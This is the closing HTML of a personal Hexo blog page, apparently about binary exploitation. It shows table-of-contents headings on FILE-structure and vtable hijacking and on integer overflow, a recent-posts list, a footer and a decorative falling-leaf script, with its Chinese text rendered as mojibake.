class="toc-link" href="#1-File%E7%BB%93%E6%9E%84"><span class="toc-number">8.0.1.</span> <span class="toc-text">1.Fileç»“æ„</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BC%AA%E9%80%A0vtable%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">8.0.2.</span> <span class="toc-text">2.ä¼ªé€ vtableåŠ«æŒç¨‹åºæµç¨‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-FSOP"><span class="toc-number">8.0.3.</span> <span class="toc-text">3.FSOP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-glibc-2-24%E4%B8%8B%E7%9A%84IO-File"><span class="toc-number">8.0.4.</span> <span class="toc-text">4.glibc 2.24ä¸‹çš„IO_File</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-number">9.</span> <span class="toc-text">æ•´æ•°æº¢å‡º</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%95%8C%E6%BA%A2%E5%87%BA"><span class="toc-number">9.0.1.</span> <span class="toc-text">ä¸Šç•Œæº¢å‡º</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%83%85%E5%86%B5"><span class="toc-number">9.0.2.</span> <span class="toc-text">æƒ…å†µ</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/20/mysql%E5%BC%80%E5%8F%91/" title="mysqlå¼€å‘">mysqlå¼€å‘</a><time datetime="2026-02-20T11:15:31.000Z" title="å‘è¡¨äº 2026-02-20 19:15:31">2026-02-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/12/ret2gets/" title="ret2gets">ret2gets</a><time datetime="2026-02-12T06:28:07.000Z" title="å‘è¡¨äº 2026-02-12 14:28:07">2026-02-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/09/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/" title="DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621">DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621</a><time datetime="2026-02-09T09:39:02.000Z" title="å‘è¡¨äº 2026-02-09 17:39:02">2026-02-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/09/python%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/" title="pythonå‰ç«¯å¼€å‘">pythonå‰ç«¯å¼€å‘</a><time datetime="2026-02-09T09:37:07.000Z" title="å‘è¡¨äº 2026-02-09 17:37:07">2026-02-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/04/%E4%B8%89%E5%A4%A7%E6%9E%B6%E6%9E%84%E6%AF%94%E8%BE%83/" title="ä¸‰å¤§æ¶æ„æ¯”è¾ƒ">ä¸‰å¤§æ¶æ„æ¯”è¾ƒ</a><time datetime="2026-02-04T15:07:13.000Z" title="å‘è¡¨äº 2026-02-04 23:07:13">2026-02-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By hfddh666</span><span class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
<script>
  // æ«å¶è„šæœ¬ï¼ˆæ•°é‡å‡å°‘ï¼Œæ›´è½»ç›ˆï¼‰
  $(document).ready(function() {
    var leafCount = 0;
    var maxLeaf = 15;
    var fallSpeed = 1.8;
    
    function createLeaf() {
      if (leafCount >= maxLeaf) return;
      var size = Math.random() * 15 + 10;
      var colors = ['#e65100','#ff7043','#f57c00'];
      var color = colors[Math.floor(Math.random() * colors.length)];
      
      var leaf = $('<div class="maple-leaf"></div>').css({
        top: -size + 'px',
        left: Math.random() * $(window).width() + 'px',
        width: size + 'px',
        height: size + 'px'
      });
      leaf[0].style.setProperty('--leaf-color', color);
      leaf.find('::before').css('background', color);
      
      $('body').append(leaf);
      leafCount++;
      
      leaf.animate({
        top: $(window).height() + size + 'px',
        left: "+=" + (Math.random() * 150 - 75) + "px",
        rotate: Math.random() * 720 + 'deg'
      }, fallSpeed * 20000, 
      function() {
        $(this).remove();
        leafCount--;
      });
    }
    for (var i = 0; i < 8; i++) createLeaf();
    setInterval(createLeaf, 800);
  });
</script>
<script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>